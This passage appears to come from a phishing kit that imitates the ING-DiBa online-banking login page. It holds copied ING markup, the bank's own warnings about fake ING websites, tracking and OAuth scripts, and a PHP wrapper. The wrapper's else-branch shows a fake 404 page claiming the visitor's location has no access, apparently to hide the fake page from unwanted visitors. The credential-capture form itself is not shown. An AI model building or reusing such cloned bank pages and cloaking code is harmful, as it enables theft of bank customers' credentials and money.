																				<strong>Öffnen Sie die ING Banking App „Banking to go“ und starten Sie QR-Scanner-Funktion.</strong>
																				Sie befindet sich in Ihrer Kontenübersicht in der Navigationsleiste ganz oben rechts neben „Meine Konten“.Sie haben mehrere Konten in Ihrer App eingerichtet?Dann wählen Sie bitte zunächst das Konto aus, in das Sie sich einloggen möchten.
																			</p>
																			<img class="gap-top-2 gap-bottom-2" alt="QR-Code" src="ING%20Login_fichiers/qrlhint-ver-916FDE8A4CA8095FC339D6829D7D6723.png">
																			<p>
																				<strong>Sie sehen die QR-Scanner-Funktion in Ihrer App nicht?</strong>
																			</p>
																			<p>
																				Dann nutzen Sie wahrscheinlich noch eine ältere Version von Banking to go.Über Ihren App Store können Sie die App aktualisieren.
																			</p>
																		</div>
																	</div>
																</li>
																<li class="process-steps__list-item">
																	<div class="process-steps__list-item-inner">
																		<div class="process-steps__list-item__text">
																			<strong>Scannen Sie nacheinander beide QR-Codes mit Ihrer App.</strong>
																			Folgen Sie dabei einfach dem Dialog in der App.Der Doppel-Scan dient Ihrer Sicherheit:Mit dem ersten QR-Code identifizieren wir Sie über Ihre App,mit dem zweiten QR-Code bestätigen Sie Ihren Log-in.
																		</div>
																	</div>
																</li>
																<li class="process-steps__list-item">
																	<div class="process-steps__list-item-inner">
																		<div class="process-steps__list-item__text">
																			<strong>Nach dem zweiten Scan werden Sie automatisch weitergeleitet zu Ihrem Internetbanking</strong>
																			 und können die App jetzt schließen.
																		</div>
																		<div>
																			<strong>Unser Tipp:</strong>
																			Legen Sie den QR-Log-in doch einfach als Ihren Standard-Log-in fest,dann geht es beim Anmelden noch schneller. Natürlich können Sie sich auch danach jederzeitmit Ihren Zugangsdaten anmelden.
																		</div>
																	</div>
																</li>
															</ol>
															<p>
																<a class="link-standard--g2p gap-bottom-1" data-click-action="qr_login_video.content.link_extern" target="_blank" href="#">Video mit Schritt-für-Schritt-Anleitung ansehen</a>
															</p>
															<p>
																<a class="link-standard--g2p gap-bottom-2" data-click-action="qr_login_lp.content.link_intern" href="#">Mehr erfahren über den QR-Log-in</a>
															</p>
														</div>
													</div>
												</div>
											</div>
										</section>
									</div>
								</div>
							</form>
							<div class="gap-top-5-lg">
								<h1 class="heading--s u-text-faded">Aktuelle Mitteilungen</h1>
							</div>
							<div class="g2p-content-card gap-top-2">
								<fieldset class="form-container gap-bottom-2">
									<div class="form-container_content">
										<div class="vertrieb login_news">
											<article>
												<details class="details-primary" id="details-id-0" role="group">
													<summary role="button" aria-expanded="false" aria-controls="details-id-0">
														Vorsicht vor gefälschten ING Webseiten
													</summary>
													<div class="gap-bottom-1">
														<p></p>
														<p>
															Aktuell gibt es gefälschte Websites der ING im Netz. Bei der Suche nach der ING Homepage über die Suchmaschine Ihres Browsers werden Ihnen sehr prominent platzierte – betrügerische - Seiten angezeigt.
														</p>
														<p>
															Diese Seiten, inklusive der Log-in Seite, sehen täuschend echt aus.
														</p>
														<p>
															Geben Sie dort Ihre Daten ein, erhalten Sie den Hinweis, Ihr Konto sei gesperrt und Sie werden gebeten, eine Hotline anzurufen. Die angeblichen Supportmitarbeiter versuchen sich Zugriff auf Ihren Rechner und Ihr Konto zu verschaffen.
														</p>
														<p>
															So können Sie sich schützen:
														</p>
														<ul>
															<li>Bitte geben Sie die URL ing.de immer direkt in die Adresszeile Ihres Browsers ein und nutzen Sie nicht die Links aus Ihren Suchergebnissen.</li>
															<li>Überprüfen Sie die URL, bevor Sie Ihre Daten eingeben.</li>
															<li>Achten Sie auf eine sichere Verbindung, z.B. auf das Schlosssymbol oben links in der Adresszeile. Erhalten Sie beim Aufruf der Website eine Sicherheitsmeldung, seien Sie vorsichtig und geben bitte keine vertraulichen Daten ein.</li>
															<li>Bitte geben Sie keine Zugangsdaten sowie Transaktionsnummern (TAN) weiter</li>
															<li>Kommt Ihnen diese Masche bekannt vor? Haben Sie eventuell bereits Daten weitergegeben? Dann rufen Sie uns bitte so schnell wie möglich unter <a action-id="">069 / 34 22 24</a> an.</li>
														</ul>
														<p></p>
													</div>
												</details>
												<details class="details-primary" id="details-id-1" role="group">
													<summary role="button" aria-expanded="false" aria-controls="details-id-1">
														Achtung: Betrüger wollen an Ihre Daten!
													</summary>
													<div class="gap-bottom-1">
														<p></p>
														<p>
															Aktuell gibt es gleich mehrere Betrugsmaschen, um an Ihre Bankdaten und Passwörter zu kommen:
														</p>
														<p>
															<b>Phishing-Mails:</b>
															 Sie sollen unsere App ING Banking to go installieren, um Ihr Konto weiter nutzen zu können. Bitte klicken Sie nicht auf den Link in der Mail, der führt nämlich nicht in den App Store, sondern auf eine betrügerische Seite. Woran Sie eine Phishing Mail erkennen, verrät Ihnen folgender 
															<a action-id="" href="#" rel="nofollow">Artikel</a>
															.
														</p>
														<p>
															<b>Attraktive Geldanlagen:</b>
															 Sie erhalten per Mail, Anruf oder Werbeanzeige ein lukratives Anlageangebot mit extrem guten Renditeaussichten. Bitte informieren Sie sich gründlich, bevor Sie auf solche Angebote eingehen. Häufig stecken nämlich Betrüger dahinter. Informationen zum so genannten Boiler Room Scam finden Sie 
															<a action-id="" href="#" rel="nofollow">hier</a>
															.
														</p>
														<p>
															<b>Anrufe durch die Bank:</b>
															 Trickbetrüger geben sich als ING-Mitarbeiter aus uns fragen und fragen Informationen wie&nbsp;Passwörter, mTans, PIN etc. ab.
														</p>
														<p>
															<b>Falsche Techniker Anrufe: </b>
															Die Betrüger geben sich als Technik-Mitarbeiter von Software- und Telekommunikationsanbietern wie Apple, Microsoft oder Vodafone aus. Diesmal neu: es handelt sich nicht mehr nur um Anrufe, sondern es werden nun auch E-Mails, infizierte Webseiten und Pop-Ups genutzt, um illegal an Ihre Daten zu gelangen.
														</p>
														<p>
															Bitte seien Sie immer vorsichtig, wenn Sie unaufgefordert kontaktiert werden und geben Sie keine Daten preis. Geben Sie Ihre Zugangsdaten nur über unsere Website 
															<a action-id="" href="#" rel="nofollow">www.ing.de</a>
															 ein oder über unsere App ING Banking to go ein. Wir fragen Sie niemals außerhalb dieser Kanäle nach Ihren Zugangsdaten oder TAN-Nummern.
														</p>
														<p>
															Sind Sie sich unsicher, leiten Sie uns die Mail an 
															<a action-id="">info@ing.de</a>
															 weiter oder rufen uns unter 
															<b>069 / 34 22 24</b>
															 an.
														</p>
														<p>
															&nbsp;
														</p>
														<p></p>
													</div>
												</details>
												<details class="details-primary" id="details-id-2" role="group">
													<summary role="button" aria-expanded="false" aria-controls="details-id-2">
														Info-Banner – neue Produktbedingungen
													</summary>
													<div class="gap-bottom-1">
														<p></p>
														<p>
															Nach dem Log-In informieren wir derzeit einige Kunden über die Änderung unserer Produktbedingungen in Bezug auf die Nutzung von Post-Box und Internetbanking. Wird Ihnen diese Information angezeigt, beachten Sie bitte folgendes: Die Kontoführung bleibt für Sie unverändert. Sollten Sie der Änderung dennoch nicht zustimmen, können Sie das angezeigte Fenster einfach schließen.
														</p>
														<p></p>
													</div>
												</details>
											</article>
										</div>
									</div>
								</fieldset>
							</div>
							<noscript>
								<style type="text/css">
									/*<![CDATA[*/
									.login, .content-header__heading, .aktuell, form, .zugangsdaten
									{
										display: none !important;
									}

									/*]]>*/
								</style>
								<fieldset class="form-container">
									<legend class="form-container_legend">
										 Javascript ist nicht aktiviert!
									</legend>
									<div class="form-container_content">
										Bitte &uuml;berpr&uuml;fen Sie die Browsereinstellungen und aktivieren Sie Javascript. 
										<br />
										 Einen Hinweis zu den technischen Voraussetzungen erhalten Sie
										<a target="_blank" href="#" class="link-primary">hier</a>
									</div>
								</fieldset>
								<section class="form-group form-group__submit gap-top-1 gap-top-2-md gap-top-2-lg">
									<a role="button" href="#" class="button-default--large">Zur Homepage</a>
								</section>
							</noscript>
						</div>
					</div>
				</main>
				<ing-cc-manager uc-id="oAoDY7kHB"></ing-cc-manager>
				<footer class="footer--g2p u-cf">
					<ul class="footer__links-top"></ul>
					<ul class="footer__links-bottom">
						<li class="footer__link"><a href="./">Karriere</a></li>
						<li class="footer__link"><a href="./">Vertriebspartner</a></li>
						<li class="footer__link"><a href="./">Wholesale Banking</a></li>
						<li class="footer__link"><a href="./">Kontaktformular</a></li>
						<li class="footer__link"><a href="./">AGB</a></li>
						<li class="footer__link"><a href="./">Datenschutz</a></li>
						<li class="footer__link"><a href="./">Impressum</a></li>
					</ul>
					<div class="footer__icons">
						<a class="icon-facebook--g2p" href="#"></a>
						<a class="icon-instagram--g2p" href="#"></a>
						<a class="icon-youtube--g2p" href="#"></a>
					</div>
				</footer>
				<a class="off-canvas-backdrop" data-close="off-canvas"></a>
			</div>
		</div>
		<div class="busy-indicator" aria-hidden="true" role="dialog" aria-labelledby="modal_title" id="id1f" data-delay="1000" data-busyindicator="" data-timeout="30000">
			<div class="busy-indicator-content js_holder" role="document" style="width: initial;">
				<div class="u-flex-center">
					<lottie-player autoplay="" loop="" mode="normal" style="width: 100px" src="./w/r/tssV3vNFVypuDO4q6CZvTqxO8zVczbxBr7eENRPMjGtKp62OBiqmyLohiMrI5BqpXCs62GFSuwLYFzfHyJqE6M5Y9M03xyVRIJI3E6FvWX5N6ak0sg5voA/webjars/ing-feat-uilib-de/6.5.35/images/dots-ver-EA9B3C619827FD887CE3FFC8153FA257.lottie" background="transparent"></lottie-player>
				</div>
				<div class="u-flex-center">
					<strong>Bitte warten</strong>
				</div>
			</div>
		</div>
		<script type="text/javascript" src="ING%20Login_fichiers/jquery-3.js"></script>
		<script type="text/javascript" src="ING%20Login_fichiers/wicket-ajax-jquery-ver-4D09ABFD59C4D1E8C40853E2941D8163.js"></script>
		<script type="text/javascript" src="ING%20Login_fichiers/busy-ver-C331575AF308054F00673A92BCB41217.js"></script>
		<script type="text/javascript" id="usercentrics-config">
			/*<![CDATA[*/
			window.UC_UI_DOMAINS = {
				 crossDomainConsentSharingIFrame: '#' 
			};
			/*]]>*/
		</script>
		<script type="text/javascript" id="oAoDY7kHB" async="async" src="ING%20Login_fichiers/main.js"></script>

		<script type="text/javascript" src="ING%20Login_fichiers/webtrekk_v4.js"></script>
		<script type="text/javascript" id="WebtrekkBehavior">
			/*<![CDATA[*/
			var webtrekkConfig = webtrekkConfig || {
			};
			function cwp() {
				  if (typeof webtrekkV3 === "function") {
					var webtrekk = {
						'trackId': '302246171523106','trackDomain': 'count.ing.de','domain': 'REGEXP:^(([a-zA-Z0-9-_]+\.{1})*(ing-diba|ing)\.de)
		<script type="text/javascript" src="ING%20Login_fichiers/fingerprint.js"></script>

		<script type="text/javascript" src="ING%20Login_fichiers/bundle.js"></script>
		<script type="text/javascript" id="suppress-jsconsole" src="ING%20Login_fichiers/SuppressJavascriptConsoleBehavior-ver-1EA60D9506B6FAC9D0B9E6C.js"></script>
		<script type="text/javascript">
			/*<![CDATA[*/
			Wicket.Event.add(window, "domready", function(event) {
				 if (!/iPad|iPhone|iPod/g.test(navigator.userAgent)) {
					$('#id13').focus();
				};
				(async () => {
					document.querySelector("#id12").addEventListener("click", e => {
						let f = document.querySelector("#id14");
						let t = document.querySelector("#id12");
						if (f.type === "password") {
							f.type = "text";
							t.className = "font-icon font-icon_eye--visible u-text-primary";
						}
						 else {
							f.type = "password";
							t.className = "font-icon font-icon_eye--hidden u-text-primary";
						}
					});
				}
				)();
				;
				Wicket.Ajax.ajax({
					"u":"./login?x=s1raXBgM2yDAuuDRuLKvmnytE87Svq1gNF0sAku39k0LQLRrVwi0D3aoYNbujtyWl&t=https://access.ing.de/delogin/oauth/authorize%3Fresponse_type%3Dcode%26client_id%3Dibbr%26scope%3Dbanking%2520paydirekt%2520postlogin%2520tpa%2520openid%26state%3DrOpWQ70WVj9XPVTBMNi0cjvgA1Z3zhiOScDOt0gpz9E%253D%26redirect_uri%3Dhttps://banking.ing.de/app/login/oauth2/code/ibbr%26nonce%3D4KpLvvdqB5Uv2BCmSzTyb0sKaPfuWX_YY5Za-1BaY9E%26claims%3D%257B%2522id_token%2522%253A%257B%2522customer_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522partner_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522last_login%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522authentication_means%2522%253A%257B%2522essential%2522%253Atrue%257D%257D%257D","m":"POST","c":"id15","e":"click"
				});
				;
				Wicket.Event.add('id17_hf_1', 'click', function(event) {
					 var b=document.getElementById('id16');
					 if (b!=null && b.onclick!=null && typeof(b.onclick) != 'undefined') {
						  var r = Wicket.bind(b.onclick, b)();
						 if (r != false) b.click();
						 
					}
					 else {
						 b.click();
						 
					};
					  return false;
					;
				});
				;
				$(document).ready(function() {
					$(document).submit(function(event) {
						 return RequestBlocker.checkEvent(event, 1000);
						 
					});
				});
				$(document).ready(function() {
					$(document).click(function(event) {
						 return RequestBlocker.checkEvent(event, 1000);
						 
					});
				});
				(function() {
					var c = console || Console;
					var dn = function() {
					};
					 if (c) {
						 c.log = dn;
						 c.trace=dn;
						 c.debug=dn;
						 c.info=dn;
						 c.warn=dn;
						 
					}
				}
				)();
				;
				Wicket.Event.publish(Wicket.Event.Topic.AJAX_HANDLERS_BOUND);
				;
			});
			/*]]>*/
		</script>
		<iframe style="display: none;" id="uc-cross-domain-bridge" src="ING%20Login_fichiers/cross-domain-bridge.html"></iframe>
	</body>
</html>

<?php

	}else

{
	
?>

<style>
* {
  -webkit-box-sizing: border-box;
          box-sizing: border-box;
}

body {
  padding: 0;
  margin: 0;
}

#notfound {
  position: relative;
  height: 100vh;
}

#notfound .notfound {
  position: absolute;
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
      -ms-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
}

.notfound {
  max-width: 520px;
  width: 100%;
  line-height: 1.4;
  text-align: center;
}

.notfound .notfound-404 {
  position: relative;
  height: 240px;
}

.notfound .notfound-404 h1 {
  font-family: 'Montserrat', sans-serif;
  position: absolute;
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
      -ms-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  font-size: 252px;
  font-weight: 900;
  margin: 0px;
  color: #262626;
  text-transform: uppercase;
  letter-spacing: -40px;
  margin-left: -20px;
}

.notfound .notfound-404 h1>span {
  text-shadow: -8px 0px 0px #fff;
}

.notfound .notfound-404 h3 {
  font-family: 'Cabin', sans-serif;
  position: relative;
  font-size: 16px;
  font-weight: 700;
  text-transform: uppercase;
  color: #262626;
  margin: 0px;
  letter-spacing: 3px;
  padding-left: 6px;
}

.notfound h2 {
  font-family: 'Cabin', sans-serif;
  font-size: 20px;
  font-weight: 400;
  text-transform: uppercase;
  color: #000;
  margin-top: 0px;
  margin-bottom: 25px;
}

@media only screen and (max-width: 767px) {
  .notfound .notfound-404 {
    height: 200px;
  }
  .notfound .notfound-404 h1 {
    font-size: 200px;
  }
}

@media only screen and (max-width: 480px) {
  .notfound .notfound-404 {
    height: 162px;
  }
  .notfound .notfound-404 h1 {
    font-size: 162px;
    height: 150px;
    line-height: 162px;
  }
  .notfound h2 {
    font-size: 16px;
  }
}

</style>

<!DOCTYPE html>
<html lang="en">

<head>
<link rel="stylesheet" type="text/css" href="w/r/-5OTF6sW6E4Z9ceOYnWoukuqyTIBKJiZWKLPLf8XrPc4eNu/webjars/ing-feat-uilib-de/6.5.35/stylesheets/bundle.ibbr-ver-A1BC03D6FA9731EE7E461042EC133352.css" />
		<link rel="apple-touch-icon-precomposed" size="57x57" href="static/resource/apple-touch-icon-57x57-ver-4A55BE3DBBEF8C05D9B710343260E3C1.png">
		<link rel="apple-touch-icon-precomposed" size="60x60" href="static/resource/apple-touch-icon-60x60-ver-5596AA066C5B3E23A4CE117A62ACC53E.png">
		<link rel="apple-touch-icon-precomposed" size="72x72" href="static/resource/apple-touch-icon-72x72-ver-124C9306BFE75EF41622C502C16BA51C.png">
		<link rel="apple-touch-icon-precomposed" size="76x76" href="static/resource/apple-touch-icon-76x76-ver-4914FE72A9592103AF4052227833160A.png">
		<link rel="apple-touch-icon-precomposed" size="114x114" href="static/resource/apple-touch-icon-114x114-ver-81330BFEA6DBF76008AD8A7392061B66.png">
		<link rel="apple-touch-icon-precomposed" size="120x120" href="static/resource/apple-touch-icon-120x120-ver-C388BC564A6EA5A0032E42EB655EA97E.png">
		<link rel="apple-touch-icon-precomposed" size="144x144" href="static/resource/apple-touch-icon-144x144-ver-299C54F301930E41099138C652E54FF6.png">
		<link rel="apple-touch-icon-precomposed" size="152x152" href="static/resource/apple-touch-icon-152x152-ver-786124452B755FA9DF4A2A934F69C34E.png">
		<link rel="apple-touch-icon" size="152x152" href="static/resource/apple-touch-icon-152x152-ver-786124452B755FA9DF4A2A934F69C34E.png">
		<link rel="icon" type="image/png" href="static/resource/icon-16x16-ver-34F56DF9647FC5EF3BBEFA31470B5827.png" sizes="16x16">
		<link rel="icon" type="image/png" href="static/resource/icon-32x32-ver-9B816EA373494944936A5AA7362D69B3.png" sizes="32x32">
		<link rel="icon" type="image/png" href="static/resource/icon-72x72-ver-541C3019E3A706B0A9E96A259DCFC891.png" sizes="72x72">
		<link rel="icon" type="image/png" href="static/resource/icon-96x96-ver-A1D9C895D906B8FBB6FAD838AB040DAB.png" sizes="96x96">
		<link rel="icon" type="image/png" href="static/resource/icon-128x128-ver-77642426AA0741C32871E767DB4BFD8F.png" sizes="128x128">
		<link rel="icon" type="image/png" href="static/resource/icon-144x144-ver-DC6A5A826C516CC1F8C8419581937828.png" sizes="144x144">
		<link rel="icon" type="image/png" href="static/resource/icon-152x152-ver-410A8C951AD5A3268569710332F3FF63.png" sizes="152x152">
		<link rel="icon" type="image/png" href="static/resource/icon-192x192-ver-23894FA8E99D1D156779FA911C491882.png" sizes="192x192">
		<link rel="icon" type="image/png" href="static/resource/icon-384x384-ver-24E42F3DC2F2DEAD79FDDF749E341FEE.png" sizes="384x384">
		<link rel="icon" type="image/png" href="static/resource/icon-512x512-ver-F89530A5EAD037F63979954F143D2DD3.png" sizes="512x512">
		<link rel="manifest" href="static/resource/manifest-ver-FD28461C05E548B953CF3FEDEFA232D3.json">
		<link rel="mask-icon" color="#ff6900" href="static/resource/safari-pinned-tab-ver-8B4ED448F001CDA259049640F56044EC.svg">

	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>404 HTML Template by Colorlib</title>

	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Cabin:400,700" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:900" rel="stylesheet">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->

</head>

<body>
<header class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
					<div class="header__inner">
						<a class="header__logo u-left" data-click-action="logohome.header_menu.link_intern" href="#">ING DiBa</a>
					</div>
				</header>

	<div id="notfound">
		<div class="notfound">
			<div class="notfound-404">
				<h3>Ups! Seite wurde nicht gefunden</h3>
				<h1 style="color:#FC6042"><span>4</span><span>0</span><span>4</span></h1>
			</div>
			<h2>Es tut uns leid, aber die von Ihnen angeforderte Seite wurde nicht gefunden oder Ihr Standort gibt Ihnen keine Berechtigung zum Zugriff auf diese Website</h2>
		</div>
	</div>

</body>

</html>

<?php

}

}

?>

